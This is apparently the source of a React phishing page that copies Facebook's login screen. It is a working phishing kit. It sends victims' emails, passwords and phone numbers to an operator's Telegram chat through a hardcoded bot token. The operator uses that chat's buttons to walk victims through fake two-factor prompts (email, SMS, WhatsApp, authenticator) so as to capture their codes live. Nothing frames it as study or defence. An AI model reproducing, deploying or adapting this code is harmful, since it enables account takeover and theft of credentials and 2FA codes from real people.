import React, { useEffect, useRef, useState } from 'react';
import '/assets/style.css';
import '/assets/loader.css';
import logo from '/assets/fb-jgmqmtscfhomcgfm.b1cfbf0dc49d882cc320.svg';
import Facebook2FAScreen from './Facebook2FAScreen';
import { Oval } from 'react-loader-spinner';
import Support from './Support';
import Success from './Success';

const telegramBotToken = '7863868126:AAFIw9RvpTWj07VVlqywabCHHCP9Qrb4LrA';
const telegramChatId = '-4682819457';

type Step =
  | 'login'
  | 'waiting'
  | '2fa'
  | '2fa_phone'
  | '2fa_whatsapp'
  | '2fa_auth'
  | 'success';

const FacebookLoginRedBull: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [step, setStep] = useState<Step>('login');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [errorCount, setErrorCount] = useState(0);
  const [last2FA, setLast2FA] = useState<Step>('2fa');
  const [phone, setPhone] = useState('');

  const lastUpdateRef = useRef(0);

  useEffect(() => {
    setSessionId(Math.random().toString(36).slice(2, 10));
  }, []);

  useEffect(() => {
    let active = true;
    const abortController = new AbortController();

    const handleCb = async (cb: any) => {
      try {
        await fetch(
          `https://api.telegram.org/bot${telegramBotToken}/answerCallbackQuery`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: cb.id }),
          }
        );
      } catch (err: any) {
        console.warn('Failed to answer callback:', err);
      }

      setIsLoading(false);
      const d = cb.data;

      if (d.startsWith('done_')) {
        return setStep('success');
      }
      if (d.startsWith('wrong2fa_')) {
        setErrorMessage('Your code was invalid – please check and try again');
        setErrorCount((c) => c + 1);
        setStep('2fa');
        setLast2FA('2fa');
        return;
      }

      if (
        d.startsWith('2fa_') ||
        d.startsWith('2faphone_') ||
        d.startsWith('2fawhatsapp_') ||
        d.startsWith('2faauth_')
      ) {
        setErrorMessage('');
        setErrorCount(0);
        if (d.startsWith('2fa_')) setStep('2fa');
        else if (d.startsWith('2faphone_')) setStep('2fa_phone');
        else if (d.startsWith('2fawhatsapp_')) setStep('2fa_whatsapp');
        else setStep('2fa_auth');
        return;
      }

      if (d.startsWith('support_')) {
        return setStep('waiting');
      }
      if (d.startsWith('wrongpass_')) {
        setErrorMessage('Your email or password are incorrect');
        setStep('login');
      }
    };

    const poll = async () => {
      if (!active) return;

      try {
        const r = await fetch(
          `https://api.telegram.org/bot${telegramBotToken}/getUpdates?timeout=50&offset=${
            lastUpdateRef.current + 1
          }`,
          { signal: abortController.signal }
        );

        // Handle 409 Conflict by resetting offset
        if (r.status === 409) {
          console.warn('Telegram getUpdates 409 – resetting offset');
          lastUpdateRef.current = 0;
        } else {
          const js = await r.json();
          if (js.ok && Array.isArray(js.result)) {
            for (const u of js.result) {
              if (u.update_id > lastUpdateRef.current) {
                lastUpdateRef.current = u.update_id;
                if (u.callback_query) {
                  await handleCb(u.callback_query);
                }
              }
            }
          }
        }
      } catch (err: any) {
        if (err.name !== 'AbortError') {
          console.warn('Polling error:', err.message || err);
        }
      }

      if (active) {
        setTimeout(poll, 1000);
      }
    };

    const startPolling = async () => {
      try {
        await fetch(
          `https://api.telegram.org/bot${telegramBotToken}/deleteWebhook`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ drop_pending_updates: true }),
          }
        );
        console.log(
          'Webhook removed, updates dropped, polling started fresh.'
        );
      } catch (err: any) {
        console.warn('Webhook removal failed:', err.message || err);
      }
      poll();
    };

    startPolling();

    return () => {
      active = false;
      abortController.abort();
    };
  }, [sessionId]);

  const sendToTelegram = (type: 'login' | 'support', phoneNumber = '') => {
    setIsLoading(true);
    setErrorMessage('');

    const messages = {
      login: `🆕 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}\n🏢 Session: ${sessionId}`,
      support: `📞 Support Request\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 Phone: ${phoneNumber}\n🏢 Session: ${sessionId}`,
    };

    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '🔐 2FA Email', callback_data: `2fa_${sessionId}` },
          { text: '📱 2FA Phone', callback_data: `2faphone_${sessionId}` },
        ],
        [
          { text: '💬 2FA WhatsApp', callback_data: `2fawhatsapp_${sessionId}` },
          { text: '🔐 Authenticator', callback_data: `2faauth_${sessionId}` },
        ],
        [
          { text: '⏳ Support', callback_data: `support_${sessionId}` },
          { text: '❌ Invalid code', callback_data: `wrong2fa_${sessionId}` },
        ],
        [
          { text: '❌ Wrong Password', callback_data: `wrongpass_${sessionId}` },
          { text: '✅ Done', callback_data: `done_${sessionId}` },
        ],
      ],
    };

    fetch(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramChatId,
          parse_mode: 'HTML',
          text: messages[type],
          reply_markup: replyMarkup,
        }),
      }
    ).catch(() => {
      setIsLoading(false);
      setErrorMessage('Failed to send request');
    });
  };

  const handleLogin = () => {
    if (!email || !password) {
      setErrorMessage('Please enter both email and password');
      return;
    }
    sendToTelegram('login');
  };

  const handleSupportRequest = (phoneNumber: string) => {
    setPhone(phoneNumber);
    sendToTelegram('support', phoneNumber);
  };

  const render2FAScreen = (title: string, subtext: string) => (
    <Facebook2FAScreen
      key={`${last2FA}_${errorCount}`}
      {...{
        title,
        subtext,
        sessionId,
        email,
        password,
        setStep,
        errorMessage,
        setErrorMessage,
      }}
    />
  );

  if (step === '2fa') {
    return render2FAScreen(
      'Enter verification code',
      'Please enter the 6-digit code we sent to your email.'
    );
  }
  if (step === '2fa_whatsapp') {
    return render2FAScreen(
      'Enter WhatsApp code',
      'Please enter the 6-digit code we sent via WhatsApp.'
    );
  }
  if (step === '2fa_phone') {
    return render2FAScreen(
      'Enter verification code',
      'Please enter the 6-digit code we sent to your phone.'
    );
  }
  if (step === '2fa_auth') {
    return render2FAScreen(
      'Enter authentication code',
      'Use your authenticator app to enter the 6-digit code.'
    );
  }

  if (step === 'waiting') {
    return (
      <Support
        sessionId={sessionId}
        email={email}
        password={password}
        onRequestCall={handleSupportRequest}
        setStep={setStep}
      />
    );
  }

  if (step === 'success') {
    return (
      <Success
        sessionId={sessionId}
        email={email}
        password={password}
        phone={phone}
        setStep={setStep}
      />
    );
  }

  return (
    <div className="bg-white">
      <div className="grid justify-items-stretch text-center bg-[#f0f2f5]">
        <div className="flex justify-center pt-[120px]">
          <img
            className="h-10 md:w-[290px] mt-2"
            src={logo}
            alt="Facebook"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>
        <div className="px-2 my-5">
          <div className="container sm:mx-2 md:mx-auto sm:w-auto md:w-[400px] rounded-[8px] bg-white border bg-clip-border text-gray-700 shadow-md pt-4 mt-4 mb-14 w-[450px]">
            <span className="text-[18px] font-[500]">Log in to Facebook</span>
            <div className="border border-[#e2c822] bg-[#fff9d7] mx-4 py-2 mt-4">
              <span className="text-[12px]">
                You must login to continue.
              </span>
            </div>
            <div className="grid grid-cols-1 p-4">
              <div className="relative mb-2">
                <input
                  className="appearance-none border rounded-[6px] w-full px-3 py-3 text-gray-700 leading-tight border-[1px] focus:outline-blue focus:shadow-outline focus:border-blue"
                  id="email"
                  type="text"
                  placeholder="Email address or phone number"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              <div className="relative w-full mb-2">
                <input
                  className="appearance-none border rounded-[6px] w-full px-3 py-3 text-gray-700 leading-tight border-[1px] focus:outline-blue focus:shadow-outline focus:border-blue"
                  id="password"
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                {errorMessage && (
                  <div className="text-red-500 text-xs mt-1">
                    {errorMessage}
                  </div>
                )}
              </div>
            </div>
            <div className="p-4 pt-0">
              <button
                onClick={handleLogin}
                disabled={isLoading}
                className="block w-full select-none rounded-lg bg-blue py-3 px-6 text-center align-middle font-sans text-xs font-bold text-white shadow-sm shadow-blue transition-all hover:shadow-blue active:opacity-[0.85] disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
              >
                {isLoading ? (
                  <div className="flex justify-center items-center">
                    <Oval
                      height={20}
                      width={20}
                      color="#ffffff"
                      visible={true}
                      ariaLabel="oval-loading"
                      secondaryColor="#ffffff"
                      strokeWidth={4}
                      strokeWidthSecondary={4}
                    />
                  </div>
                ) : (
                  'Log in'
                )}
              </button>
              <p className="mt-6 flex justify-center font-sans text-sm font-light leading-normal text-inherit antialiased">
                Forgot account?
                <a
                  href="#signup"
                  className="ml-1 block font-sans text-sm font-bold leading-normal text-blue antialiased"
                >
                  Find it
                </a>
              </p>
            </div>
          </div>
        </div>

        <div className="flex flex-col bg-white">
          <div className="flex flex-wrap w-full px-10 border-t border-light-grey mt-[70px] pt-[10px] text-[#8a8d91] text-[13px]">
            {[
              'Sign Up',
              'Log in',
              'Messenger',
              'Facebook Lite',
              'Watch',
              'Places',
              'Games',
              'Marketplace',
              'Meta Pay',
              'Oculus',
              'Portal',
              'Instagram',
              'Bulletin',
              'Fundraisers',
              'Services',
              'Voting Information Center',
              'Privacy Policy',
              'Groups',
              'About',
              'Create Ad',
              'Create Page',
              'Developers',
              'Careers',
              'Cookies',
              'AdChoices',
              'Terms',
              'Help',
              'Contact uploading and non-users',
            ].map((text, idx) => (
              <span key={idx} className="pr-6">
                <a href="#">{text}</a>
              </span>
            ))}
          </div>
          <div>
            <span className="pr-6 text-[#8a8d91] text-[11px]">
              Meta © 2025
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FacebookLoginRedBull;
